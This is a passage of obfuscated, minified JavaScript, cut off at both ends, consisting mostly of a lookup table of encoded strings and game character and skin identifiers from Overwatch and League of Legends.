x289e),'lnvAo':_0x240d04(0x51a),'mlteT':_0x240d04(0x251d),'syHKT':_0x240d04(0x64e),'ruNZr':_0x240d04(0x440),'TpZtG':_0x240d04(0x480),'GdYxj':_0x240d04(0x11eb),'vARBX':'stracer','YLdzO':_0x240d04(0xe23),'hmiJF':_0x240d04(0x1871),'gxAUM':_0x240d04(0x1d84),'YAEtM':_0x240d04(0x2225),'HbsJj':_0x240d04(0x1c49),'knNeu':_0x240d04(0xab2),'pfwYm':_0x240d04(0x1940),'XJkBi':_0x240d04(0x1344),'pOufN':'smei','okZcB':_0x240d04(0x20a0),'yQhNv':_0x240d04(0x1c20),'pPEwH':_0x240d04(0xbc4),'PAShp':_0x240d04(0x8d2),'UZARS':_0x240d04(0x14fa),'mRvAM':_0x240d04(0x115b),'JILSi':_0x240d04(0x274f)+'r','AqyUA':_0x240d04(0x111c),'HhQyG':'rtorbjorn','AShyY':_0x240d04(0x1cdf),'xppRr':_0x240d04(0xa9f),'jEPms':_0x240d04(0x134a),'CiSmP':_0x240d04(0x2aa4),'JPAKC':_0x240d04(0x2883),'ZKPCi':_0x240d04(0x10b3),'QddaB':_0x240d04(0x1635),'XbfJw':_0x240d04(0x2b38),'ZoFRH':'rhanzo','cOOZw':'rgenji','LOsKa':'reinhardt','reVCD':_0x240d04(0x2777),'KDMeo':_0x240d04(0x2d7c),'lKewV':_0x240d04(0xb5b),'hWrwl':_0x240d04(0x120)+'r','otbJs':_0x240d04(0xd2),'wlrTM':_0x240d04(0x59a),'QrUxk':_0x240d04(0xc68),'LHWEl':'qroadhog','TVAEP':_0x240d04(0x15f5),'VJhoX':_0x240d04(0x14b4),'bLZYk':_0x240d04(0x28af),'QLHzY':'qorisa','oWxOs':_0x240d04(0x1071),'YUHqW':'qmccree','OFZKm':_0x240d04(0x17be),'BdsYW':_0x240d04(0xbe9),'eNeqT':_0x240d04(0x28c1),'YpvSl':_0x240d04(0x299a),'RRQft':_0x240d04(0x8d8),'JPhQY':_0x240d04(0x27f6),'NFjMP':_0x240d04(0x11b4),'ZadLb':'pzarya','UKKgk':'pwinston','DLvkD':'ptracer','MoZnN':_0x240d04(0x1ffc),'LAbZJ':_0x240d04(0x52f),'Ikrol':'psombra','YFaRQ':_0x240d04(0x23f4),'yQTnU':_0x240d04(0x11b6),'bzMrl':_0x240d04(0x1508),'eKONS':_0x240d04(0x2632),'xaWiJ':_0x240d04(0xba5),'nbPxd':_0x240d04(0x846),'RVTuf':_0x240d04(0x9e9),'Aapxv':_0x240d04(0x14fd),'SSlLr':_0x240d04(0x1c1b),'qhJQh':_0x240d04(0x1a88),'kplTg':_0x240d04(0x1f9a),'xCXPP':_0x240d04(0x2b68)+'r','pRDve':_0x240d04(0x227a),'lRVgH':'osymmetra','gfEeA':_0x240d04(0x202a),'TMjzV':_0x240d04(0x270f),'BjGAd':_0x240d04(0x158b),'NqGEA':_0x240d04(0x1201),'hSMbB':_0x240d04(0x1397),'VOadS':_0x240d04(0xe1e),'wZTxz':'omccree','BSHUx':_0x240d04(0xad1),'wcCsi':'ojunkrat','lluQM':_0x240d04(0x1f1c),'VipDH':'ogenji','MeBPb':_0x240d04(0x1101),'tHkWe':'obastion','lFIqL':_0x240d04(0x194a),'dcYpK':_0x240d04(0x1e5e),'dbZnI':_0x240d04(0x2cb2)+'r','ydNRg':'ntracer','yQMcx':_0x240d04(0x24d6),'LdAzG':_0x240d04(0x23c7),'EooLT':_0x240d04(0x2102),'VAnGx':_0x240d04(0x5f5),'xzMCt':'nreinhardt','aBPNz':_0x240d04(0x1474),'eZuSR':_0x240d04(0x6c2),'bLFBb':_0x240d04(0x2abb),'qUgbH':'nmercy','BtJDX':_0x240d04(0x1573),'kcRwj':'nmccree','EIGnQ':'nlucio','QIABE':_0x240d04(0x2cca),'bDnuY':'ngenji','FSCfA':_0x240d04(0x2bb5),'afuvS':_0x240d04(0x220c),'tuvnY':_0x240d04(0x4d1),'alsFl':'mzarya','UTfYW':_0x240d04(0x1171),'rhbtP':_0x240d04(0x19b9)+'r','ATZYn':_0x240d04(0xbca),'DaguF':_0x240d04(0x1341),'pqESn':_0x240d04(0x839),'MQsaE':_0x240d04(0x2299),'iqNKT':_0x240d04(0x188d),'pzrGP':_0x240d04(0x22d0),'HcJqH':'mpharah','CECCL':_0x240d04(0x2b66),'MEnTP':_0x240d04(0x681),'KGKfh':_0x240d04(0x52d),'ebEse':_0x240d04(0x1970),'DQJnp':'mei','cQOTd':_0x240d04(0x11d5),'PqafG':'mbastion','RpcvT':'mana','XnMOn':_0x240d04(0x970),'UmPIS':'lzarya','axfsF':_0x240d04(0x1da1)+'r','gKYhQ':_0x240d04(0xdbe),'lVEIp':_0x240d04(0x13cc),'yYjQS':'lsymmetra','fiJTk':'lsombra','KYzLy':_0x240d04(0x2735),'SkeQD':_0x240d04(0x259b),'VdQmX':_0x240d04(0xc1e),'DvJev':_0x240d04(0x25bd),'dXkER':'lmei','BnoOQ':_0x240d04(0x2c3f),'uKjKv':_0x240d04(0x150a),'yrQyD':_0x240d04(0x1ee6),'kiThC':'lgenji','fZIyl':_0x240d04(0x21d2),'Cxfiv':_0x240d04(0x173b),'iRhqc':_0x240d04(0xfed),'JKOCq':_0x240d04(0x2d56),'rWKCU':_0x240d04(0x1922),'kiZSU':_0x240d04(0x2d34),'qTXZz':_0x240d04(0x1dd1),'NqCer':'kroadhog','dCYFe':_0x240d04(0x1e1d),'Vivyx':_0x240d04(0x2ed1),'EwiXW':_0x240d04(0x1f6e),'LssIk':_0x240d04(0x2eb6),'PJtgS':_0x240d04(0x2014),'MJILP':_0x240d04(0x2df9),'VmIkp':_0x240d04(0x14cd),'ZPQRl':_0x240d04(0x24da),'WfZJc':_0x240d04(0x25da),'uOsPA':_0x240d04(0xb96),'sbrYy':'kgenji','QGDCZ':_0x240d04(0x4e4),'sqleE':_0x240d04(0x2001),'DPxQF':_0x240d04(0x8ad),'rZcpx':_0x240d04(0x29f2),'QXYir':_0x240d04(0x2939),'VVxKL':_0x240d04(0x14c9),'trhdP':'jsombra','pBwQn':_0x240d04(0x2b56),'jZSPU':_0x240d04(0xc11),'otPEh':_0x240d04(0x86f),'FrtEI':_0x240d04(0x2e7b),'tffxF':_0x240d04(0x189a),'gHbrM':'jmei','ZRFYN':_0x240d04(0x2b84),'utNKO':'jgenji','mWlus':_0x240d04(0x20dd),'NMmwL':_0x240d04(0x10b7),'MDfIG':'izarya','xlnLc':_0x240d04(0x223),'FpKox':_0x240d04(0x3c7)+'r','BYnla':'itorbjorn','WvUgS':_0x240d04(0x909),'BCnwc':_0x240d04(0x172e),'RxDwI':_0x240d04(0x145),'BMtJs':'ireaper','eyYJw':_0x240d04(0x2c31),'mlhWl':_0x240d04(0x1ed5),'EIfxK':_0x240d04(0x2661),'tifKj':'ihanzo','uqKiI':_0x240d04(0xd7c),'zNtFe':_0x240d04(0x18ce),'MMhkW':'hzenyatta','kMxXM':_0x240d04(0x129c),'tovxY':_0x240d04(0x2150),'PiaJF':_0x240d04(0x1a60),'ZrUZt':_0x240d04(0x1160),'qIKCN':'hroadhog','ZQJtJ':_0x240d04(0x2a99),'BARHK':'hreaper','kORZM':_0x240d04(0xe0f),'UkFlf':'hmercy','FaMaO':'hmei','gFmOv':'hmccree','faDbF':'hjunkrat','FUgmr':_0x240d04(0x1c1f),'PaTMt':'hdva','dSnaC':_0x240d04(0x1691),'gENUE':_0x240d04(0x1fd3),'BFqDF':_0x240d04(0xf18),'aMyrx':_0x240d04(0x1c3e)+'r','BSuHl':'gtracer','pOaGX':_0x240d04(0x1529),'wfXeF':_0x240d04(0xb8f),'pRHSq':_0x240d04(0x2812),'ppELJ':_0x240d04(0x847),'cugUz':_0x240d04(0x759),'SMqIS':'gmercy','Jxghm':'gmei','GKYiM':'gmccree','VYCqY':_0x240d04(0x2abc),'VjbZJ':_0x240d04(0x188f),'XTdGi':_0x240d04(0xe3c)+_0x240d04(0x1231),'sbmWo':'fzarya','ScpQu':_0x240d04(0x108b)+'r','GHDUr':'ftracer','FoByS':_0x240d04(0x1e99),'rRXVF':_0x240d04(0x2b05),'wyDxb':_0x240d04(0x201e),'lRolP':_0x240d04(0x2788),'WlrHq':_0x240d04(0x14a2),'Nbocm':_0x240d04(0x2da6),'LxFTX':'fpharah','OecEa':_0x240d04(0x17a2),'jmJCV':_0x240d04(0x293),'aUiPg':'fmccree','WHEkr':_0x240d04(0x2a39),'eiFwj':_0x240d04(0x2266),'aUUAK':_0x240d04(0x4dc),'xRrhW':_0x240d04(0x2cd6),'GCRFI':'ezenyatta','DgnDx':'ewinston','gHaLR':_0x240d04(0xd2b)+'r','ZxTFp':_0x240d04(0x2875),'BSvAa':'etorbjorn','ZJcqc':_0x240d04(0x289b),'ZplmP':_0x240d04(0x20e),'cQzkm':_0x240d04(0x27d0),'xvzOs':_0x240d04(0x2049),'OnDxX':_0x240d04(0x17cd),'aVcQO':_0x240d04(0x884),'QvWhm':_0x240d04(0x2cc3),'noPjW':_0x240d04(0x1c15),'mlgRU':'ejunkrat','iFvum':_0x240d04(0x13ab),'enNGF':_0x240d04(0x8b1),'kjbLN':'dwidowmake'+'r','SZfzG':_0x240d04(0x1930),'NDLYQ':'dsymmetra','rNefE':_0x240d04(0x19c3),'gassi':'droadhog','WXAAR':_0x240d04(0x2ab8),'cwNpH':_0x240d04(0x1ce4),'RASZa':_0x240d04(0x636),'iyobR':_0x240d04(0x2090),'VUrzh':_0x240d04(0x77c),'AbKWF':_0x240d04(0x310),'dqZPx':_0x240d04(0x20b2),'mPHlI':'dhanzo','AdvHb':_0x240d04(0x2317),'dyzVw':_0x240d04(0xb6b),'Lcqrm':'czarya','VncwB':'cwinston','rkBcX':_0x240d04(0x2bf6)+'r','ugKGf':'ctorbjorn','leSFI':_0x240d04(0x20d),'PCLyo':_0x240d04(0x10aa),'OjkbV':_0x240d04(0x6c1),'ArnjE':_0x240d04(0x137b),'okAOW':'creaper','xmAWD':_0x240d04(0xe86),'ejBiS':_0x240d04(0xdf8),'Cnbyi':'cmercy','wDyZk':_0x240d04(0xe42),'OEeAg':_0x240d04(0x161e),'nIxlQ':_0x240d04(0x1ec7),'tMNGL':_0x240d04(0x4d4),'DaaKj':_0x240d04(0x11d1),'hjaxI':_0x240d04(0x28e9),'PEazP':_0x240d04(0xf0c),'IWvCR':'bwidowmake'+'r','HYeGL':'btorbjorn','rJrBm':_0x240d04(0x1916),'ZJIBu':_0x240d04(0x1f7e),'wuNiX':_0x240d04(0x114d),'dOPNK':_0x240d04(0xcff),'tAycs':_0x240d04(0x82c),'AzEXK':_0x240d04(0x341),'PDNaY':_0x240d04(0x27a4),'YPMzd':_0x240d04(0x1514),'FvtaH':_0x240d04(0x1516),'NWTfz':_0x240d04(0x485),'PzcVV':_0x240d04(0x265d),'LhvCL':_0x240d04(0x14ab),'MDKAa':'azarya','RcmLO':_0x240d04(0x39e),'ZZmxr':_0x240d04(0x22a2)+'r','EmTeJ':_0x240d04(0xde2),'CcuJR':_0x240d04(0x245c),'nGers':_0x240d04(0x1a16),'yaQPJ':_0x240d04(0x304),'JEvUc':_0x240d04(0xd6b),'jmykI':_0x240d04(0x2807),'CpSmc':_0x240d04(0x2915),'KpNFR':_0x240d04(0x1089),'uqpiD':'alucio','NUIdp':_0x240d04(0xde4),'YWAWp':_0x240d04(0x2e3f),'fEsgG':_0x240d04(0x2a29),'gcPev':'adva','IMjWs':_0x240d04(0x1892),'SXBuo':'ydoomfist','MjHhS':'udoomfist','idcsW':_0x240d04(0x19f7),'XKqVF':'sdoomfist','XEVhi':_0x240d04(0xcc6),'oNDUK':_0x240d04(0x53c),'hAfOW':_0x240d04(0x28db),'nSHwC':'ndoomfist','JQrzy':_0x240d04(0x12ba),'iRtRz':'ldoomfist','ASwfP':_0x240d04(0x6cc),'yXkPW':'jdoomfist','TmeLs':_0x240d04(0x6aa),'zrRNn':_0x240d04(0x2276),'YXTtV':_0x240d04(0x1c5e),'tuJcc':_0x240d04(0x2772),'kMuRe':_0x240d04(0x2c54),'SUFGT':_0x240d04(0x1da0),'mToLa':_0x240d04(0x2626),'QnXRl':function(_0x5c77de,_0x3953be){return _0x5c77de!==_0x3953be;},'NAnmG':_0x240d04(0x27e9),'nFIua':_0x240d04(0xe43),'ZdYav':function(_0x4063aa,_0x5732e7){return _0x4063aa(_0x5732e7);},'igefd':function(_0x2ca7df,_0x3cba5e){return _0x2ca7df(_0x3cba5e);},'jEmFr':function(_0x5e74a2,_0x4f4a3d){return _0x5e74a2+_0x4f4a3d;},'RpAcg':function(_0x4ae39e,_0x17f48d){return _0x4ae39e+_0x17f48d;},'HXHCE':_0x240d04(0x1e1f),'EbRnk':'switcher-3'+'\x20','SRWBw':_0x240d04(0x263f),'zyUxf':_0x240d04(0xd56),'IuSXa':_0x240d04(0x2518),'IKhaW':_0x240d04(0x1bfd),'XoPRl':_0x240d04(0x1762),'Ykrcu':'sia','jiYvv':'navy-seals','mpmKq':_0x240d04(0x22da),'hHbtc':_0x240d04(0x1e6f),'UXSiT':'shadow','LAyot':_0x240d04(0x4df),'stUaN':_0x240d04(0xbf1),'FIKvi':_0x240d04(0x1338),'RHdNU':_0x240d04(0x1975),'gVtCg':_0x240d04(0x2e96),'RAeqm':_0x240d04(0x2a4f),'ohDzA':_0x240d04(0x195d),'TstEd':_0x240d04(0x2106),'LxWiW':function(_0x4435c9,_0x2f99be){return _0x4435c9+_0x2f99be;},'vjSiN':function(_0x47d411,_0x5aa4f7){return _0x47d411(_0x5aa4f7);},'qGPow':function(_0x1cab78,_0x16b7ef){return _0x1cab78(_0x16b7ef);},'wHLeO':function(_0x3343ef,_0x1942f9){return _0x3343ef+_0x1942f9;},'UVVty':function(_0x1d21af,_0x3609bc){return _0x1d21af+_0x3609bc;},'Mcbda':'katarina-0','LaBIS':_0x240d04(0x117),'mURQR':_0x240d04(0x1b42),'bpFLn':'zilean-2','djANO':'zilean-1','GySVd':_0x240d04(0x2a6e),'fbSRT':_0x240d04(0x2bd2),'IHNJd':'ziggs-0','iyMqn':'zed-3','hNzMs':_0x240d04(0x2995),'mfHuW':_0x240d04(0x1c43),'CnoZf':_0x240d04(0x2b9d),'StufR':_0x240d04(0x1d7a),'oUvID':'yorick-1','DTiIM':_0x240d04(0x117f),'GYwkn':_0x240d04(0xe1a),'YbgZc':_0x240d04(0x236f),'MOLhr':'xinzhao-4','PIlMG':_0x240d04(0x12a3),'xwhCh':_0x240d04(0xe80),'VudIu':_0x240d04(0x1637),'GOJKz':_0x240d04(0x5b0),'FYuzX':_0x240d04(0x1290),'zyOmQ':_0x240d04(0x26a),'nOVcz':_0x240d04(0xb4f),'YbCxS':_0x240d04(0x2509),'LQlhZ':_0x240d04(0x17fd),'pNtdd':'warwick-3','IHOTI':'warwick-0','ApqJg':_0x240d04(0x818),'xGOhz':_0x240d04(0x1bee),'IPVAO':_0x240d04(0x1887),'gcjsm':_0x240d04(0x1659),'PCvqU':_0x240d04(0x23ad),'ckamU':_0x240d04(0x214a),'GxgDN':_0x240d04(0x25c2),'IuGgn':_0x240d04(0x3a2),'oLqge':'vladimir-0','drmJg':'viktor-1','jsvbA':_0x240d04(0x235b),'orjRc':_0x240d04(0x25d4),'scaiZ':'vi-0','dMeTq':_0x240d04(0x67c),'DipuD':'velkoz-0','wuUkK':_0x240d04(0x16a3),'kjREg':_0x240d04(0x2aa),'QgjBL':_0x240d04(0x1d9a),'rjADR':_0x240d04(0xfee),'lXDxr':_0x240d04(0xcad),'LoWra':_0x240d04(0x2c46),'UPsVa':_0x240d04(0x29ae),'Ugbaj':_0x240d04(0x15ee),'UARSb':'varus-6','bYpvL':'varus-3','ZdqNK':_0x240d04(0x1ff1),'mhAmY':_0x240d04(0x1ef9),'JkyXz':'urgot-1','kXuID':_0x240d04(0x23c5),'qaSRn':_0x240d04(0x2d0),'Ipbex':_0x240d04(0x2baa),'mBgQW':_0x240d04(0x29e7),'bZcDQ':_0x240d04(0x183f),'XtIZZ':_0x240d04(0x2a83),'htvCK':_0x240d04(0x26b0),'PpzqB':_0x240d04(0x28e2),'UHARl':_0x240d04(0x4d6),'JpGgH':'twistedfat'+_0x240d04(0x2929),'MfaEt':'twistedfat'+'e-8','vRJrQ':_0x240d04(0x15ea)+_0x240d04(0x170c),'ThgsS':_0x240d04(0x15ea)+_0x240d04(0x1bd7),'jhYLb':_0x240d04(0x15ea)+_0x240d04(0x1b6c),'rqAFF':'twistedfat'+_0x240d04(0x1102),'JurwD':_0x240d04(0x1003)+'-9','OfmHj':_0x240d04(0x1003)+'-8','dxHkb':_0x240d04(0x1003)+'-7','GMXor':_0x240d04(0x1003)+'-5','wHPwD':_0x240d04(0x1003)+'-1','kvbPJ':_0x240d04(0x1003)+'-0','ijJmL':_0x240d04(0x1a79),'uqALh':'trundle-4','GLaof':'trundle-3','WlsPO':_0x240d04(0x224a),'YzgLS':_0x240d04(0x1111),'KXPRO':_0x240d04(0x1924),'YxerB':'tristana-1'+'1','SjAHL':_0x240d04(0x2408),'uUaNM':_0x240d04(0x352),'PdBKV':'teemo-6','LnaqK':_0x240d04(0xbb1),'ZJAuU':_0x240d04(0x1608),'hPGkl':_0x240d04(0x22fb),'lVfvz':_0x240d04(0x272c),'KuwZP':_0x240d04(0x26e1),'ADjKO':_0x240d04(0x898),'IKFRp':'taric-0','rReLr':_0x240d04(0x1158),'sLGSX':_0x240d04(0x1307),'aGFpT':'talon-2','qdhyN':_0x240d04(0x998),'WsZoS':_0x240d04(0x9b0),'kzdAo':'taliyah-0','TNLtq':_0x240d04(0x4de)+'1','ZfuNu':_0x240d04(0x4de)+'0','yOKvf':_0x240d04(0x130f),'vmMGF':_0x240d04(0x8e5),'ZZnbK':_0x240d04(0x2a34),'klehy':_0x240d04(0x481),'QbdPs':'soraka-4','KwUoW':_0x240d04(0x2513),'TcpiW':'sona-5','sQyNG':_0x240d04(0x1d52),'xXvSn':'sona-1','knKcP':_0x240d04(0x2468),'FRIqN':_0x240d04(0x92a),'GKzWw':_0x240d04(0x1b50),'rpKbd':'sivir-7','UZLbw':_0x240d04(0x189f),'rmFif':_0x240d04(0x2184),'NaRmd':_0x240d04(0x29eb),'ZTnyO':_0x240d04(0x1331),'OaNqy':'sion-1','RCThw':'sion-0','lLWtd':_0x240d04(0xef2),'aiFfS':'singed-7','crfig':_0x240d04(0x2bf8),'DyhZO':'singed-4','crFLY':_0x240d04(0x1a37),'KJgnx':_0x240d04(0x2230),'THcvF':'shyvana-6','fUWas':_0x240d04(0xdbc),'tAOjP':_0x240d04(0x868),'NfADl':_0x240d04(0x290),'nahZw':'shyvana-0','tLpne':_0x240d04(0x409),'OAICE':_0x240d04(0x28ea),'XaRkq':_0x240d04(0x2de0),'pomMB':'shen-0','kShrI':_0x240d04(0x240f),'JbMVY':_0x240d04(0xad9),'cVwgR':_0x240d04(0x1ff2),'Jszrw':_0x240d04(0x694),'jlgdN':_0x240d04(0xea5),'snrJN':'shaco-1','YSKLv':_0x240d04(0x4b0),'kdLtx':'sejuani-6','vrcPB':_0x240d04(0x2e18),'vrEYy':'sejuani-0','CdqOd':'ryze-9','ZSYYp':_0x240d04(0x2853),'ItCoE':_0x240d04(0x1c8d),'uFfWI':'ryze-6','xeCDt':'ryze-5','BcGGQ':_0x240d04(0x18e7),'BooLz':_0x240d04(0x13d2),'YypfQ':_0x240d04(0x269b),'GCpWD':_0x240d04(0x15e8),'CToNJ':'rumble-1','XNozR':'riven-3','OreVN':'riven-1','slIza':_0x240d04(0x492),'lEJCl':_0x240d04(0x392),'gapBW':_0x240d04(0x16c9),'zaDJQ':_0x240d04(0x2d02),'liYVL':'renekton-9','IhPHy':_0x240d04(0x12fc),'NSBNu':_0x240d04(0x2a66),'IKggD':'renekton-1','upSzy':_0x240d04(0x2646),'IYHLK':_0x240d04(0xca0),'WAOdY':'reksai-2','FXPvy':_0x240d04(0x185e),'UVOxt':_0x240d04(0x203f),'AJzRX':_0x240d04(0x15ac),'gnEdD':'rammus-4','MQQSf':'rammus-0','TxVKx':'rakan-1','aoiqw':_0x240d04(0x124e),'akZVp':'quinn-4','cdupl':'quinn-1','IeKUx':_0x240d04(0x2773),'fiMoQ':'poppy-7','klANg':'poppy-6','EjKoW':_0x240d04(0x1efc),'UQsos':_0x240d04(0x1bf6),'ItSOt':_0x240d04(0xc91),'dCMAW':'poppy-0','Qjqws':_0x240d04(0x80d),'zuRer':_0x240d04(0x1129),'KQidy':'pantheon-5','micGV':_0x240d04(0x12f3),'hinuq':_0x240d04(0x2e24),'fBhKh':_0x240d04(0x1263),'UAdkY':_0x240d04(0xaf1),'fZDQA':_0x240d04(0x8e0),'wBCfe':'olaf-4','cQKit':_0x240d04(0x6a4),'uUzMC':'olaf-0','koBtL':_0x240d04(0x2ae0),'znILt':_0x240d04(0x6f7),'UUtpy':_0x240d04(0x19d6),'PDjQD':'nunu-0','ceKqa':_0x240d04(0x2206),'pzuUk':'nocturne-1','bSEvI':_0x240d04(0x1628),'fHTEe':_0x240d04(0x17b),'VEOyS':_0x240d04(0x28c),'fyaWK':_0x240d04(0x1f41),'ZjDlO':'nidalee-5','rbxPT':_0x240d04(0x251e),'VdZaC':_0x240d04(0x11c3),'blsOB':_0x240d04(0x1f64),'rIVuB':_0x240d04(0x2d83),'INYpR':_0x240d04(0x1fec),'KlAbY':'nasus-0','IdxiA':_0x240d04(0x1ab7),'qYYiA':_0x240d04(0x897),'UjYtd':_0x240d04(0x25a),'reEUL':_0x240d04(0x832),'StzEU':'nami-0','NFUjZ':_0x240d04(0x1bb9),'sJvNf':_0x240d04(0x38e),'Iebdc':_0x240d04(0x1a41),'hoqbe':_0x240d04(0x9b6)+'-5','hZOkM':_0x240d04(0x9b6)+'-4','lBYDW':'nonkeyking'+'-3','BfHSP':_0x240d04(0x9b6)+'-2','pAuUR':'nonkeyking'+'-0','JPHHR':_0x240d04(0x2de5)+_0x240d04(0x2707),'vUdXC':_0x240d04(0x2de5)+_0x240d04(0x1e3c),'oUqpa':_0x240d04(0x2de5)+_0x240d04(0x170c),'cYSKR':_0x240d04(0x2de5)+_0x240d04(0x15df),'fGGDY':_0x240d04(0x2de5)+'e-1','aWlFy':_0x240d04(0x2de5)+_0x240d04(0x1102),'gmrCD':'nasteryi-1','ffsSo':_0x240d04(0x2c61),'eWJpj':_0x240d04(0x16d9),'RnQuV':_0x240d04(0x17d3),'mrWWE':'naokai-7','xoWeF':'naokai-5','KnlYR':_0x240d04(0xd83),'JkhWO':_0x240d04(0x18f),'yMZKD':_0x240d04(0xfec),'ZkZZL':_0x240d04(0x6a3),'GjMPY':'nalzahar-3','LUTPJ':_0x240d04(0x21de),'yJouW':_0x240d04(0x1e2),'DXkaZ':_0x240d04(0x24ca),'oBNUu':_0x240d04(0xa87),'HjMAd':_0x240d04(0x14dc),'LLetz':_0x240d04(0x1ba9),'XcHcx':_0x240d04(0x2a07),'FZtga':'lux-1','DhFmJ':_0x240d04(0x253f),'aPNEK':_0x240d04(0x1cc2),'aIQTw':_0x240d04(0x2c6d),'uyqXz':_0x240d04(0x2774),'zIZZw':_0x240d04(0x2cc4),'RYGXN':_0x240d04(0xc10),'hFUzL':_0x240d04(0x889),'pCjwy':'lissandra-'+'3','fUVgo':_0x240d04(0x1186)+'0','xHjYv':'leona-9','ucXnH':_0x240d04(0xc3e),'odHRQ':'leona-4','OOQfF':_0x240d04(0x2b15),'uOlJv':_0x240d04(0x264d),'vPKZu':_0x240d04(0x9af),'wElge':_0x240d04(0x1b35),'OQkxN':'leesin-1','LGVOE':_0x240d04(0x244d),'DDIhM':'leesin-10','rHSjR':_0x240d04(0x1408),'BhXms':'leblanc-2','PHOMW':_0x240d04(0x10d0),'blToh':_0x240d04(0x8ac),'adgIW':'kogmaw-9','DUYhU':_0x240d04(0x156c),'MmcoU':_0x240d04(0x2028),'GqlUu':_0x240d04(0x2155),'UnXkP':_0x240d04(0x2905),'xkqAz':_0x240d04(0xa35),'AhPvv':_0x240d04(0x126d),'uWtTf':_0x240d04(0x2761),'vHTLR':_0x240d04(0x174b),'Lgczi':'khazix-0','bycdw':_0x240d04(0x2cd5),'EHYqj':_0x240d04(0xceb),'eXxNn':'kennen-5','pdzMb':'kennen-4','WFtdp':'kennen-3','hjJTz':_0x240d04(0x14f9),'awSCF':'kennen-0','sNVYD':'kayle-8','rlTsr':_0x240d04(0xc12),'TekNk':_0x240d04(0x239d),'twKhq':'kayle-1','YDegU':_0x240d04(0xeb7),'TlUPH':_0x240d04(0x203c),'BBYUr':_0x240d04(0x17ad),'aLHru':_0x240d04(0x208c),'JNuvt':'kassadin-1','QrHYg':_0x240d04(0x2cfe),'IruFm':'karthus-4','zHCcl':_0x240d04(0x1f90),'egUgw':_0x240d04(0x1135),'RRRGZ':_0x240d04(0xc46),'mobyl':_0x240d04(0x11c),'qydok':_0x240d04(0x7fb),'KBzQj':_0x240d04(0x760),'nqEZQ':_0x240d04(0x286d),'LoDlU':_0x240d04(0x1d1c),'aHUHj':'jinx-0','ONcoY':_0x240d04(0x1672),'kgVui':'jayce-0','OjxBN':_0x240d04(0x2d81),'eNvYH':_0x240d04(0x16a),'lEDKc':_0x240d04(0x2647),'ahJgg':_0x240d04(0x18be),'gzeWD':_0x240d04(0x1a76),'oRDUI':_0x240d04(0xe7d),'QqTxU':_0x240d04(0x2e54),'zYtRM':_0x240d04(0x2cdd),'jprbN':_0x240d04(0xcc2),'zfDYD':_0x240d04(0x2b2c),'Hfmra':'janna-7','IZvYR':'janna-5','vSuuu':_0x240d04(0x774),'xqJzW':'ivern-1','hObNl':_0x240d04(0x5a6),'PExjs':_0x240d04(0xf11),'lyVtf':_0x240d04(0x2143),'tbFeb':_0x240d04(0x9ba),'oJaJZ':_0x240d04(0x1555)+_0x240d04(0x2564),'dYNCR':'heimerding'+'er-0','xzFtl':_0x240d04(0x2595),'JmZTQ':'hecarim-5','TnGso':'hecarim-4','AdOss':_0x240d04(0x1af1),'rbcXj':'graves-7','wqxha':_0x240d04(0x208d),'cKXaE':'graves-1','nCFjf':_0x240d04(0xcf1),'VTRxv':'gragas-9','TzclA':_0x240d04(0x1ff5),'xikKe':_0x240d04(0x241f),'saiin':_0x240d04(0x19f3),'sMDzr':_0x240d04(0x2030),'pIrAA':_0x240d04(0x2bf3),'jYywe':'gragas-1','UGWZP':_0x240d04(0x2ca8),'PiQqR':'gnar-1','gjMjF':_0x240d04(0x2654),'nfenu':_0x240d04(0x969),'ygawo':'garen-3','gXPDP':_0x240d04(0x1a92),'tcgPk':'garen-1','xhLpZ':_0x240d04(0x26b3),'YLjDG':_0x240d04(0x2c30),'WJlsR':'garen-11','PPRpB':'gangplank-'+'8','qAllh':_0x240d04(0x256e)+'7','hODjQ':_0x240d04(0x256e)+'6','vkHQq':_0x240d04(0x256e)+'5','OJlso':_0x240d04(0x256e)+'4','qZhwY':_0x240d04(0x256e)+'3','eXjcz':_0x240d04(0x256e)+'2','EXfmc':_0x240d04(0x256e)+'1','NLJUj':_0x240d04(0x256e)+'0','nWSlO':_0x240d04(0xa41),'sYOSh':'galio-4','asvKz':_0x240d04(0x2eb2),'IcjCy':_0x240d04(0x244),'LdKSV':_0x240d04(0xbdf),'nWkTp':_0x240d04(0x101f),'swzuq':_0x240d04(0xe5b),'MWdle':_0x240d04(0x294b),'PZoXb':_0x240d04(0x13c1),'pKdDy':_0x240d04(0x1629),'JXogt':_0x240d04(0x2252),'AuHAt':_0x240d04(0x29f8),'wyhhg':'fiora-0','gRJuK':_0x240d04(0x83c)+_0x240d04(0x1c0d),'LZCmJ':_0x240d04(0x83c)+_0x240d04(0x1711),'FWVtJ':'fiddlestic'+_0x240d04(0x230a),'qWFiG':'fiddlestic'+_0x240d04(0x24d3),'VwRWt':_0x240d04(0x60e),'oQpZu':_0x240d04(0x15c5),'MSifG':_0x240d04(0x2695),'lKQVW':_0x240d04(0x16d5),'raFTg':_0x240d04(0xf5d),'EROcG':'evelynn-0','UthzP':_0x240d04(0x3ac),'CRyQv':_0x240d04(0x12d7),'VVFJH':_0x240d04(0x1ffa),'vyBhC':_0x240d04(0xdc5),'yurYu':_0x240d04(0x685),'vFdOZ':_0x240d04(0x203b),'rgaQe':_0x240d04(0x22c),'bHyTQ':_0x240d04(0xc73),'BJFhJ':_0x240d04(0x8cf),'BWuVj':_0x240d04(0xe15),'yDYMh':_0x240d04(0x6fe),'dPlft':_0x240d04(0x2a12),'BSssI':_0x240d04(0x705),'SubEE':'diana-1','LdMSp':_0x240d04(0x23cd),'dIudd':'diana-11','CMnfX':'darius-8','XrVjt':'darius-4','bEBOQ':_0x240d04(0x920),'YRBOj':'darius-0','kUmxC':_0x240d04(0x2cbb),'uGwBf':_0x240d04(0x853),'ollhv':'corki-7','tbvwK':_0x240d04(0x2f7),'GKmub':_0x240d04(0xe14),'YHZvn':_0x240d04(0x1257),'mksVp':_0x240d04(0x16bb),'myNZM':'corki-0','xzMff':'chogath-6','wQyIQ':_0x240d04(0x9b9),'laMVS':'chogath-4','vrNZY':_0x240d04(0x2303),'pWVYs':_0x240d04(0x1911),'vJCYn':_0x240d04(0x23a1)+'-0','gBFLG':'camille-0','luCEV':_0x240d04(0x19e8),'MFylO':_0x240d04(0x1e40),'atRpy':_0x240d04(0x268a),'Gvpgp':_0x240d04(0x19da),'MGMip':_0x240d04(0x2e56),'hozJH':'braum-2','pANAx':_0x240d04(0x29f4),'iLLSK':'braum-0','oOheq':'braum-10','TlGVx':_0x240d04(0x2aec),'rzxWE':'brand-0','jVHan':'blitzcrank'+'-6','fLUaw':_0x240d04(0x2676)+'-5','sMNWQ':_0x240d04(0x2676)+'-1','MCLUn':_0x240d04(0x2676)+'-0','luqzy':_0x240d04(0x